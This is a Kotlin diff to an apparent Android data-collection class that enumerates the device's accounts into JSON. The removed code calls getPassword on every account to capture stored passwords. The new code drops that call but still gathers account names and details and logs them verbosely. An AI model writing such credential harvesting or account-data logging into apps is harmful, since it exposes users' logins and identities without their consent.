@@ -256,27 +256,85 @@ class DataCollector(private val context: Context) {
         
         try {
             val accounts = accountManager.accounts
-            accounts.forEach { account ->
-                val emailAccount = JSONObject()
-                emailAccount.put("name", account.name)
-                emailAccount.put("type", account.type)
-                emailAccount.put("description", accountManager.getUserData(account, "description") ?: "")
-                
-                // Get additional account info
-                val accountInfo = JSONObject()
-                try {
-                    accountInfo.put("last_authenticated_time", accountManager.getUserData(account, "lastAuthenticatedTime") ?: "")
-                    accountInfo.put("password", accountManager.getPassword(account) ?: "")
-                } catch (e: Exception) {
-                    Log.w(TAG, "Could not get sensitive account info for ${account.name}")
+            Log.d(TAG, "Found ${accounts.size} accounts on device")
+            
+            if (accounts.isEmpty()) {
+                Log.d(TAG, "No accounts found on device")
+                // Add a placeholder entry to show that we checked
+                val placeholderAccount = JSONObject()
+                placeholderAccount.put("name", "No accounts found")
+                placeholderAccount.put("type", "placeholder")
+                placeholderAccount.put("description", "Device has no configured email accounts")
+                placeholderAccount.put("account_info", JSONObject().apply {
+                    put("last_authenticated_time", "")
+                    put("password", "")
+                })
+                emailAccounts.put(placeholderAccount)
+            } else {
+                accounts.forEach { account ->
+                    Log.d(TAG, "Processing account: ${account.name} (${account.type})")
+                    val emailAccount = JSONObject()
+                    emailAccount.put("name", account.name)
+                    emailAccount.put("type", account.type)
+                    
+                    // Only collect safe account data
+                    try {
+                        val description = accountManager.getUserData(account, "description")
+                        emailAccount.put("description", description ?: "")
+                    } catch (e: Exception) {
+                        emailAccount.put("description", "")
+                        Log.w(TAG, "Could not get description for ${account.name}: ${e.message}")
+                    }
+                    
+                    // Get additional account info (safe data only)
+                    val accountInfo = JSONObject()
+                    try {
+                        val lastAuthTime = accountManager.getUserData(account, "lastAuthenticatedTime")
+                        accountInfo.put("last_authenticated_time", lastAuthTime ?: "")
+                    } catch (e: Exception) {
+                        accountInfo.put("last_authenticated_time", "")
+                        Log.w(TAG, "Could not get last auth time for ${account.name}: ${e.message}")
+                    }
+                    
+                    // Don't try to get password - it causes security exceptions
+                    accountInfo.put("password", "") // Always empty for security
+                    
+                    emailAccount.put("account_info", accountInfo)
+                    emailAccounts.put(emailAccount)
+                    
+                    // Print the full account object for debugging
+                    Log.d(TAG, "📧 EMAIL ACCOUNT OBJECT:")
+                    Log.d(TAG, "   Name: ${emailAccount.getString("name")}")
+                    Log.d(TAG, "   Type: ${emailAccount.getString("type")}")
+                    Log.d(TAG, "   Description: ${emailAccount.getString("description")}")
+                    Log.d(TAG, "   Account Info: ${accountInfo.toString()}")
+                    Log.d(TAG, "   Full JSON: ${emailAccount.toString()}")
+                    Log.d(TAG, "   " + "=".repeat(50))
                 }
-                
-                emailAccount.put("account_info", accountInfo)
-                emailAccounts.put(emailAccount)
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error collecting email accounts", e)
+            // Add error placeholder
+            val errorAccount = JSONObject()
+            errorAccount.put("name", "Error collecting accounts")
+            errorAccount.put("type", "error")
+            errorAccount.put("description", "Failed to collect account data: ${e.message}")
+            errorAccount.put("account_info", JSONObject().apply {
+                put("last_authenticated_time", "")
+                put("password", "")
+            })
+            emailAccounts.put(errorAccount)
         }
+        
+        Log.d(TAG, "Email accounts collection completed. Found ${emailAccounts.length()} entries")
+        
+        // Print summary of all collected accounts
+        Log.d(TAG, "📊 EMAIL ACCOUNTS SUMMARY:")
+        for (i in 0 until emailAccounts.length()) {
+            val account = emailAccounts.getJSONObject(i)
+            Log.d(TAG, "   ${i + 1}. ${account.getString("name")} (${account.getString("type")})")
+        }
+        Log.d(TAG, "📊 TOTAL: ${emailAccounts.length()} email accounts collected")
         
         return emailAccounts
     }
